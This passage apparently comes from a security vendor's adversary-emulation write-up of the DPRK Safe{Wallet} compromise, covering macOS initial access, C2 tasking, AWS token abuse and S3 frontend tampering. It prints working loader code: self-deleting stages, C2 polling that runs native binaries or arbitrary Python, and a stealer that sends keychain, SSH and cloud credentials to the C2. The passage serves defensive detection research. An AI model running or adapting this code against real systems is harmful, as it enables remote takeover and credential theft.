<p>We recreated this malicious setup by hosting the YAML deserialization payload on a Python+Flask web application, using PythonAnywhere to mimic attacker infrastructure. We updated the malicious URL in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">data_fetcher.py</code> script to point to our PythonAnywhere-hosted YAML payload.</p>
<p>When PyYAML loads and executes the malicious YAML payload, it performs the following actions:</p>
<p>First, it creates a directory named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Public</code> in the victim’s home directory.</p>
<pre><code>directory = os.path.expanduser(&quot;~&quot;)
directory = os.path.join(directory, &quot;Public&quot;)

if not os.path.exists(directory):
    os.makedirs(directory)</code></pre>
<p>Next, it decodes and writes a base64-encoded Python loader script into a new file named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__init__.py</code> within the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Public</code> directory.</p>
<pre><code>filePath = os.path.join(directory, &quot;__init__.py&quot;)

with open(filePath, &quot;wb&quot;) as f:
    f.write(base64.b64decode(b&quot;BASE64_ENCODED_LOADER_SCRIPT&quot;))</code></pre>
<p>Finally, it executes the newly created <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__init__.py</code> script silently in the background, initiating the second stage of the attack.</p>
<pre><code>subprocess.Popen([sys.executable, filePath], start_new_session=True, stdout=DEVNULL, stderr=DEVNULL)</code></pre>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="python-loader-script" class="absolute -top-32"></span>Python Loader Script</h4>
<p>(VT Hash: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">937c533bddb8bbcd908b62f2bf48e5bc11160505df20fea91d9600d999eafa79</code>)</p>
<p>To avoid leaving forensic evidence, the loader first deletes its file (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__init__.py</code>) after execution, leaving it running in memory only.</p>
<pre><code>directory = os.path.join(home_directory, &quot;Public&quot;)

    if not os.path.exists(directory):
        os.makedirs(directory)

    try:
        body_path = os.path.join(directory, &quot;__init__.py&quot;)
        os.remove(body_path)</code></pre>
<p>This loader’s primary goal is to establish continuous communication with the Command-and-Control (C2) server. It gathers basic system information—like OS type, architecture, and system version—and sends these details to the C2 via an HTTP POST request to the hardcoded /club/fb/status URL endpoint.</p>
<pre><code>params = {
        &quot;system&quot;: platform.system(),
        &quot;machine&quot;: platform.machine(),
        &quot;version&quot;: platform.version()
    }
    while True:
        try:
            response = requests.post(url, verify=False, data = params, timeout=180)</code></pre>
<p>Based on the server’s response (ret value), the loader decides its next steps.</p>
<h5 class="eyebrow relative"><span id="ret--0" class="absolute -top-32"></span>ret == 0:</h5>
<p>The script sleeps for 20 seconds and continues polling.</p>
<pre><code>if res[&#x27;ret&#x27;] == 0:
    time.sleep(20)
    continue</code></pre>
<h5 class="eyebrow relative"><span id="ret--1" class="absolute -top-32"></span>ret == 1:</h5>
<p>The server response includes a payload in Base64. The script decodes this payload, and writes it to a file—named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init.dll</code> if on Windows or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init</code> otherwise—and then dynamically loads the library using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ctypes.cdll.LoadLibrary</code>, which causes the payload to run as a native binary.</p>
<pre><code>elif res[&#x27;ret&#x27;] == 1:
    if platform.system() == &quot;Windows&quot;:
        body_path = os.path.join(directory, &quot;init.dll&quot;)
    else:
        body_path = os.path.join(directory, &quot;init&quot;)
        with open(body_path, &quot;wb&quot;) as f:
            binData = base64.b64decode(res[&quot;content&quot;])
            f.write(binData)
            os.environ[&quot;X_DATABASE_NAME&quot;] = &quot;&quot;
            ctypes.cdll.LoadLibrary(body_path)</code></pre>
<h5 class="eyebrow relative"><span id="ret--2" class="absolute -top-32"></span>ret == 2:</h5>
<p>The script decodes the Base64 content into Python source code and then executes it using Python’s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">exec()</code> function. This allows for running arbitrary Python code.</p>
<pre><code>elif res[&#x27;ret&#x27;] == 2:
    srcData = base64.b64decode(res[&quot;content&quot;])
    exec(srcData)</code></pre>
<h5 class="eyebrow relative"><span id="ret--3" class="absolute -top-32"></span>ret == 3:</h5>
<p>The script decodes a binary payload (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dockerd</code>) and a binary configuration file (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">docker-init</code>) into two separate files, sets their permissions to be executable, and then attempts to run them as a new process, supplying the config file as an argument to the binary payload. After execution of the binary payload, it deletes its executable file, leaving the config file on disk for reference.</p>
<pre><code>elif res[&#x27;ret&#x27;] == 3:
    path1 = os.path.join(directory, &quot;dockerd&quot;)
    with open(path1, &quot;wb&quot;) as f:
        binData = base64.b64decode(res[&quot;content&quot;])
        f.write(binData)

    path2 = os.path.join(directory, &quot;docker-init&quot;)
    with open(path2, &quot;wb&quot;) as f:
        binData = base64.b64decode(res[&quot;param&quot;])
        f.write(binData)

    os.chmod(path1, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR |
                    stat.S_IRGRP | stat.S_IXGRP |
                    stat.S_IROTH | stat.S_IXOTH)

    os.chmod(path2, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR |
                    stat.S_IRGRP | stat.S_IXGRP |
                    stat.S_IROTH | stat.S_IXOTH)

    try:
        process = subprocess.Popen([path1, path2], start_new_session=True)
        process.communicate()
        return_code = process.returncode
        requests.post(SERVER_URL + &#x27;/club/fb/result&#x27;, verify=False, data={&quot;result&quot;: str(return_code)})
    except:
        pass

    os.remove(path1)</code></pre>
<h5 class="eyebrow relative"><span id="ret--9" class="absolute -top-32"></span>ret == 9:</h5>
<p>The script breaks out of its polling loop, terminating further actions.</p>
<pre><code>elif res[&#x27;ret&#x27;] == 9:
    break</code></pre>
<p>After processing any command, the script continues to poll for further instructions from the C2 server.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="python-loader-emulation" class="absolute -top-32"></span>Python Loader Emulation</h4>
<p>Our goal was to test each of the command options within the loader to better understand what was happening, collect relevant telemetry data, and analyze it for the purpose of building robust detections for both our endpoint and the SIEM.</p>
<p><strong>Ret == 1: Write Library to Disk, Load and Delete Dylib</strong></p>
<p>The payload we used for this option was a <a href="https://github.com/MythicAgents/poseidon">Poseidon</a> payload compiled as a shared library (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.dylib</code>).</p>
<p></p>
<p>We then base64-encoded the binary and were able to hardcode the path to that base64-encoded payload in our C2 server to be served when testing this specific loader command.</p>
<pre><code>base64 poseidon.dylib &gt; poseidon.b64</code></pre>
<pre><code>BINARY_PAYLOAD_B64 = &quot;BASE64_ENCODED_DYLIB_PAYLOAD&quot;  # For ret==1
STEALER_PAYLOAD_B64 = &quot;BASE64_ENCODED_STEALER_SCRIPT&quot; # For ret==2
MULTI_STAGE_PAYLOAD_B64 = &quot;BASE64_ENCODED_MULTISTAGE_PAYLOAD&quot; # For ret==3
# For testing we simulate a command to send.
# Options: 0, 1, 2, 3, 9.
# 0: Idle (sleep); 1: Execute native binary; 2: Execute Python code; 3: Execute multi-stage payload; 9: Terminate.
COMMAND_TO_SEND = 1   # Change this value to test different actions</code></pre>
<p>Once we received our Poseidon payload callback to our <a href="https://github.com/its-a-feature/Mythic">Mythic C2</a> we were able to retrieve credentials using a variety of different methods provided by Poseidon.</p>
<p>Option 1: <a href="https://github.com/MythicAgents/poseidon/blob/master/documentation-payload/poseidon/commands/download.md">download command</a> - Access file, reads content, sends data back to C2.<br/>
<!-- -->Option 2: <a href="https://github.com/MythicAgents/poseidon/blob/master/documentation-payload/poseidon/commands/getenv.md">getenv command</a> - Read user environment variables and send content back to C2.<br/>
<!-- -->Option 3: <a href="https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/poseidon/agentfunctions/jsimport.go">jsimport</a> &amp; <a href="https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/poseidon/agentfunctions/jsimport_call.go">jsimport_call</a> commands - Import JXA script into memory then call a method within the JXA script to retrieve credentials from file and return contents.</p>
<h5 class="eyebrow relative"><span id="ret--2-receive-and-execute-arbitrary-python-code-within-process-memory" class="absolute -top-32"></span>Ret == 2: Receive and Execute arbitrary Python code within Process Memory</h5>
<p>(VT Hash: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">e89bf606fbed8f68127934758726bbb5e68e751427f3bcad3ddf883cb2b50fc7</code>)</p>
<p>The loader script allows for the running of arbitrary Python code or scripts, in memory. In Unit42’s blog they provided a Python script they observed the DPRK executing via this return value. This script collects a vast amount of data. This data is XOR encoded and sent back to the C2 server via a POST request. For the emulation all that was needed was to add our C2 URL with the appropriate route as defined in our C2 server and base64 encode the script hardcoding its path within our server for when this option was tested.</p>
<pre><code>def get_info():
    global id
    id = base64.b64encode(os.urandom(16)).decode(&#x27;utf-8&#x27;)
    
    # get xor key
    while True:
        if not get_key():
            break

        base_info()
        send_directory(&#x27;home/all&#x27;, &#x27;&#x27;, home_dir)
        send_file(&#x27;keychain&#x27;, os.path.join(home_dir, &#x27;Library&#x27;, &#x27;Keychains&#x27;, &#x27;login.keychain-db&#x27;))
        send_directory(&#x27;home/ssh&#x27;, &#x27;ssh&#x27;, os.path.join(home_dir, &#x27;.ssh&#x27;), True)
        send_directory(&#x27;home/aws&#x27;, &#x27;aws&#x27;, os.path.join(home_dir, &#x27;.aws&#x27;), True)
        send_directory(&#x27;home/kube&#x27;, &#x27;kube&#x27;, os.path.join(home_dir, &#x27;.kube&#x27;), True)
        send_directory(&#x27;home/gcloud&#x27;, &#x27;gcloud&#x27;, os.path.join(home_dir, &#x27;.config&#x27;, &#x27;gcloud&#x27;), True)
        finalize()
        break</code></pre>
<h5 class="eyebrow relative"><span id="ret--3-write-binary-payload-and-binary-config-to-disk-execute-payload-and-delete-file" class="absolute -top-32"></span>Ret == 3: Write Binary Payload and Binary Config to Disk, Execute Payload and Delete File</h5>
<p>For ret == 3 we used a standard Poseidon binary payload and a “configuration file” containing binary data as specified in the loader script. We then base64 encoded both the binary and config file like the ret == 1 option above and hardcoded their paths in our C2 server for serving when testing this command. Same as the ret == 1 option above we were able to use those same commands to collect credentials from the target system.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="c2-infrastructure" class="absolute -top-32"></span>C2 Infrastructure</h4>
<p>We created a very simple and small C2 server, built with Python+Flask, intended to listen with a specified port on our Kali Linux VM and evaluate incoming requests, responding appropriately based on the route and return value we wished to test.</p>
<p></p>
<p>We also used the open source <a href="https://github.com/its-a-feature/Mythic">Mythic C2</a> in order to facilitate the creation and management of the Poseidon payloads we used. Mythic is an open source C2 framework created and maintained by <a href="https://github.com/its-a-feature">Cody Thomas</a> at <a href="https://specterops.io/">SpecterOps</a>.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="malicious-python-application-docker-version" class="absolute -top-32"></span>Malicious Python Application: Docker Version</h4>
<p>We also explored a Dockerized variant of the malicious Python application. This version was packaged in a minimal Python Docker container (python:3.12.2-slim) running in privileged mode, granting it the ability to access host resources.</p>
<p>A containerized application creates a telemetry and detection blind spot on macOS because Apple&#x27;s Endpoint Security Framework (ESF) lacks the ability to introspect containerized processes. While ESF and endpoint detection solutions can still observe the trusted Docker process accessing sensitive host files—such as SSH keys, AWS credentials, or user configuration data—these actions commonly align with standard developer workflows. As a result, security tools are less likely to scrutinize or trigger alerts on containerized activities, offering attackers increased stealth when operating from within Docker environments.</p>
<p>This highlights the necessity for additional monitoring like <a href="https://www.osquery.io/">OSQuery</a> and <a href="https://www.docker.com/">Docker</a> log file collection to complement standard macOS endpoint defenses. Elastic offers both <a href="https://www.elastic.co/docs/reference/integrations/osquery_manager">OSQuery</a> and <a href="https://www.elastic.co/docs/reference/beats/filebeat/filebeat-input-container">Docker</a> log file collection via our <a href="https://www.elastic.co/integrations/data-integrations">data integrations</a> for Elastic Agent alongside our Endpoint protection features.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="macos-emulation-conclusion" class="absolute -top-32"></span>MacOS Emulation Conclusion</h4>
<p>Our emulation recreated the attack against the SAFE developers’ macOS system end-to-end using the real world payloads.</p>
<p><strong>Malicious Python App:</strong></p>
<p>We began by replicating the malicious Python application described in both Mandiant’s findings and Unit42’s report. The attackers had forked a legitimate open-source application and embedded RCE access within <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">data_fetcher.py</code>. This script made outbound requests to an attacker-controlled server and conditionally fetched a malicious YAML file. Using PyYAML’s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">yaml.load()</code> with an unsafe loader, the attacker triggered arbitrary code execution via deserialization.</p>
<p><strong>PyYAML Payload Deserialization resulting in Python Loader Script Execution:</strong></p>
<p>The YAML payload wrote a base64-encoded second-stage loader to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/Public/__init__.py</code> and executed it in a detached process. We mimicked this exact flow using a Flask-based staging server hosted on PythonAnywhere.</p>
<p><strong>Python Loader Execution &amp; C2 Interaction:</strong></p>
<p>Once launched, the loader deleted its on disk file and beaconed to our emulated C2, awaited tasking. Based on the C2’s response code (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ret</code>), we tested the following actions:</p>
<ul>
<li><strong>ret == 1</strong>: The loader decoded a Poseidon payload (compiled as a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.dylib</code>) and executed it using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ctypes.cdll.LoadLibrary()</code>, resulting in native code execution from disk.</li>
<li><strong>ret == 2</strong>: The loader executed an in-memory Python stealer, matching the script shared by Unit42. This script collected system, user, browser, and credential data and exfiltrated it via XOR-encoded POST requests.</li>
<li><strong>ret == 3</strong>: The loader wrote a Poseidon binary and a separate binary configuration file to disk, executed the binary with the config as an argument, then deleted the payload.</li>
<li><strong>ret == 9</strong>: The loader terminated its polling loop.</li>
</ul>
<p><strong>Data Collection: Pre-Pivot Recon &amp; Credential Access:</strong></p>
<p>During our <strong>ret == 2</strong> test, the Python stealer gathered:</p>
<ul>
<li>macOS system information (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">platform</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">os</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">user</code>)</li>
<li>Chrome user data (Bookmarks, Cookies, Login Data, etc.)</li>
<li>SSH private keys (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.ssh</code>)</li>
<li>AWS credentials (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.aws/credentials</code>)</li>
<li>macOS Keychain files (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">login.keychain-db</code>)</li>
<li>GCP/Kube config files from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.config/</code></li>
</ul>
<p>This emulates the pre-pivot data collection that preceded cloud exploitation, and reflects how DPRK actors harvested AWS credentials from the developer’s local environment.</p>
<p>With valid AWS credentials, the threat actors then pivoted into the cloud environment, launching the second phase of this intrusion.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="aws-cloud-compromise" class="absolute -top-32"></span>AWS cloud compromise</h3>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="pre-requisities-and-setup" class="absolute -top-32"></span>Pre-requisities and Setup</h4>
<p>To emulate the AWS stage of this attack, we first leveraged Terraform to stand up the necessary infrastructure. This included creating an IAM user (developer) with an overly permissive IAM policy granting access to S3, IAM, and STS APIs. We then pushed a locally built Next.js application to an S3 bucket and confirmed the site was live, simulating a simple Safe{Wallet} frontend.</p>
<p>Our choice of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Next.js</code> was predicated on the original S3 bucket static site path - <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">https://app[.]safe[.]global/_next/static/chunks/pages/_app-52c9031bfa03da47.js</code></p>
<p>Before injecting any malicious code, we verified the integrity of the site by performing a test transaction using a known target wallet address to ensure the application responded as expected.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="temporary-session-token-retrieval" class="absolute -top-32"></span>Temporary Session Token Retrieval</h4>
<p>Following the initial access and post-compromise activity on the developer’s macOS workstation, early assumptions focused on the adversary retrieving credentials from default AWS configuration locations - such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.aws</code> or from user environment variables. It was later confirmed by Unit42’s blog that the Python stealer script targeted AWS files. These locations often store long-term IAM credentials or temporary session tokens used in standard development workflows. Based on public reporting, however, this specific compromise involved AWS user session tokens, not long-term IAM credentials. In our emulation, as the developer we added our virtual MFA device to our IAM user, enabled it and then retrieved our user session token and exported the credentials to our environment. Note that on our Kali Linux endpoint, we leveraged ExpressVPN - as done by the adversaries - for any AWS API calls or interactions with the developer box.</p>
<p>It is suspected that the developer obtained temporary AWS credentials either by the <a href="https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html">GetSessionToken</a> API operation or by logging in via AWS Single Sign-On (SSO) using the AWS CLI. Both methods result in short-lived credentials being cached locally and usable for CLI or SDK-based interactions. These temporary credentials were then likely cached in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.aws</code> files or exported as environment variables on the macOS system.</p>
<p>In the <em>GetSessionToken</em> scenario, the developer would have executed a command as such:</p>
<pre><code>aws sts get-session-token --serial-number &quot;$ARN&quot; --token-code &quot;$FINAL_CODE&quot;  --duration-seconds 43200 --profile &quot;$AWS_PROFILE&quot; --output json</code></pre>
<p>In the SSO-based authentication scenario, the developer may have run:</p>
<pre><code>aws configure sso 
aws sso login -profile &quot;$AWS_PROFILE&quot; -use-device-code &quot;OTP&quot;`</code></pre>
<p>Either method results in temporary credentials (access key, secret and session token) being saved in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.aws</code> files and made available to the configured AWS profile. These credentials are then used automatically by tools like the AWS CLI or SDKs like Boto3 unless overridden. In either case, if malware or an adversary had access to the developer’s macOS system, these credentials could have been easily harvested from the environment variables, AWS config cache or credentials file.</p>
<p>To obtain these credentials for Developer1 were created a custom script for quick automation. It created a virtual MFA device in AWS, registered the device with our Developer1 user, then called <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetSessionToken</code> from STS - adding the returned temporary user session credentials to our macOS endpoint as environment variables as shown below.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="mfa-device-registration-attempts" class="absolute -top-32"></span>MFA Device Registration Attempts</h4>
<p></p>
<p>One key assumption here is that the developer was working with a user session that had MFA enabled, either for direct use or to assume a custom-managed IAM role. Our assumption derives from the credential material compromised - AWS temporary user session tokens, which are not obtained from the console but rather requested on demand from STS. Temporary credentials returned from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetSessionToken</code> or SSO by default expire after a certain number of hours, and a session token with the ASIA* prefix would suggest that the adversary harvested a short-lived but high-impact credential. This aligns with behaviors seen in previous DPRK-attributed attacks where credentials and configurations for Kubernetes, GCP, and AWS were extracted and reused.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="assuming-the-compromised-identity-on-kali" class="absolute -top-32"></span>Assuming the Compromised Identity on Kali</h4>
<p>Once the AWS session token was collected, the adversary likely stored it on their Kali Linux system either in the standard AWS credential locations (e.g., <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.aws/credentials</code> or as environment variables) or potentially in a custom file structure, depending on tooling in use. While the AWS CLI defaults to reading from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.aws/credentials</code> and environment variables, a Python script leveraging Boto3 could be configured to source credentials from nearly any file or path. Given the speed and precision of the post-compromise activity, it is plausible that the attacker used either the AWS CLI, direct Boto3 SDK calls, or shell scripts wrapping CLI commands - all of which offer convenience and built-in request signing.</p>
<p>What seems less likely is that the attacker manually signed AWS API requests using SigV4, as this would be unnecessarily slow and operationally complex. It’s also important to note that no public blog has disclosed which user agent string was associated with the session token usage (e.g. aws-cli, botocore, etc.), which leaves uncertainty around the attacker’s exact tools. That said, given DRPK’s established reliance on Python and the speed of the attack, CLI or SDK usage remains the most reasonable assumption.</p>
<p></p>
<p><strong>Note:</strong> We did this in emulation with our Poseidon payload prior to Unit 42’s blog about the RN Loader capabilities.</p>
<p>It’s important to clarify a nuance about the AWS authentication model: using a session token does not <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_control-access_getsessiontoken.html">inherently block access to IAM API actions</a> - even actions like <a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateVirtualMFADevice.html">CreateVirtualMFADevice</a> - as long as the session was initially established with MFA. In our emulation, we attempted to replicate this behavior using a stolen session token that had MFA context. Interestingly, our attempts to register an additional MFA device failed, suggesting that there may be additional safeguards, such as explicit policy constraints, that prevent MFA registration via session tokens or the details of this behavior are still too vague and we incorrectly mimicked the behavior. While the exact failure reason remains unclear, this behavior warrants deeper investigation into the IAM policies and authentication context associated with session-bound actions.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="s3-asset-enumeration" class="absolute -top-32"></span>S3 Asset Enumeration</h4>
<p>After credential acquisition, the attacker likely enumerated accessible AWS services. In this case, Amazon S3 was a clear target. The attacker would have listed buckets available to the compromised identity across all regions and located a public-facing bucket associated with Safe{Wallet}, which hosted the frontend Next.js application for transaction processing.</p>
<p>We assume the attacker was aware of the S3 bucket due to its role in serving content for <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">app.safe[.]global</code>, meaning the bucket&#x27;s structure and assets could be publicly browsed or downloaded without authentication. In our emulation, we validated similar behavior by syncing assets from a public S3 bucket used for static site hosting.</p>
<p></p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="nextjs-app-overwrite-with-malicious-code" class="absolute -top-32"></span>Next.js App Overwrite with Malicious Code</h4>
<p>After discovering the bucket, the attacker likely used the aws s3 <a href="https://docs.aws.amazon.com/cli/latest/reference/s3/sync.html">sync</a> command to download the entire contents, which included the bundled frontend JavaScript assets. Between February 5 and February 19, 2025, they appeared to focus on modifying these assets - specifically, files like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">main.&lt;HASH&gt;.js</code> and related routes, which are output by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Next.js</code> during its build process and stored under the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">_next/static/chunks/pages/</code> directory. These bundled files contain the transpiled application logic, and according to Sygnia&#x27;s forensic report, a file named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">_app-52c9031bfa03da47.js</code> was the primary injection point for the malicious code.</p>
<p></p>
<p>Next.js applications, when built, typically store their statically generated assets under the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">next/static/</code> directory, with JavaScript chunks organized into folders like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/chunks/pages/</code>. In this case, the adversary likely formatted and deobfuscated the JavaScript bundle to understand its structure, then reverse engineered the application logic. After identifying the code responsible for handling user-entered wallet addresses, they injected their <a href="/security-labs/%60https%5B:%5D/web%5B.%5Darchive%5B.%5Dorg/web/20250219172905/https%5B:%5D/app%5B.%5Dsafe%5B.%5Dglobal/_next/static/chunks/pages/_app-52c9031bfa03da47%5B.%5Djs%60">payload</a>. This payload introduced conditional logic: if the entered wallet address matched one of several known target addresses, it would silently replace the destination with a DPRK-controlled address, redirecting funds without the user becoming aware.</p>
<p></p>
<p></p>
<p>In our emulation, we replicated this behavior by modifying the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">TransactionForm.js</code> component to check if the entered recipient address matched specific values. If so, the address was replaced with an attacker-controlled wallet. While this does not reflect the complexity of actual smart contract manipulation or delegate calls used in the real-world attack, it serves as conceptual behavior to illustrate how a compromised frontend could silently redirect cryptocurrency transactions.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="static-site-tampering-implications-and-missing-security-controls" class="absolute -top-32"></span>Static Site Tampering Implications and Missing Security Controls</h4>
<p>This type of frontend tampering is especially dangerous in Web3 environments, where decentralized applications (dApps) often rely on static, client-side logic to process transactions. By modifying the JavaScript bundle served from the S3 bucket, the attacker was able to subvert the application’s behavior without needing to breach backend APIs or smart contract logic.</p>
<p>We assume that protections such as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/object-lock.html">S3 Object Lock</a>, Content-Security-Policy (CSP), or Subresource Integrity (SRI) headers were either not in use or not enforced during the time of compromise. The absence of these controls would have allowed an attacker to modify static frontend code without triggering browser or backend integrity validation, making such tampering significantly easier to carry out undetected.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="lessons-in-defense" class="absolute -top-32"></span>Lessons in defense</h2>
<p>A successful emulation—or real-world incident response—doesn’t end with identifying attacker behaviors. It continues with reinforcing defenses to prevent similar techniques from succeeding again. Below, we outline key detections, security controls, mitigation strategies, and Elastic features that can help reduce risk and limit exposure to the tactics used in this emulation and in-the-wild (ItW) campaigns like the Safe{Wallet} compromise.</p>
<p><strong>Note:</strong> These detections are actively maintained and regularly tuned, and may evolve over time. Depending on your environment, additional tuning may be required to minimize false positives and reduce noise.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="elastics-siem-detection-and-endpoint-prevention-rules" class="absolute -top-32"></span>Elastic’s SIEM detection and endpoint prevention rules</h2>
<p>Once we understand adversary behavior through emulation and implement security controls to harden the environment, it’s equally important to explore detection opportunities and capabilities to identify and respond to these threats in real time.</p>
<p>Once we understand adversary behavior through emulation and implement security controls to harden the environment, it’s equally important to explore detection opportunities and capabilities to identify and respond to these threats in real time.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="macos-endpoint-behavior-prevention-rules" class="absolute -top-32"></span><a href="https://github.com/elastic/protections-artifacts/tree/main/behavior/rules/macos">MacOS Endpoint Behavior Prevention Rules</a></h4>
<h5 class="eyebrow relative"><span id="python-pyyaml-deserialization-payload" class="absolute -top-32"></span>Python PyYAML Deserialization Payload</h5>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_python_script_drop_and_execute.md">Python Script Drop and Execute</a>”:</strong> Detects when a Python script gets created or modified followed immediately by the execution of that script by the same Python process.</p>
<h5 class="eyebrow relative"><span id="python-loader-script-1" class="absolute -top-32"></span>Python Loader Script</h5>
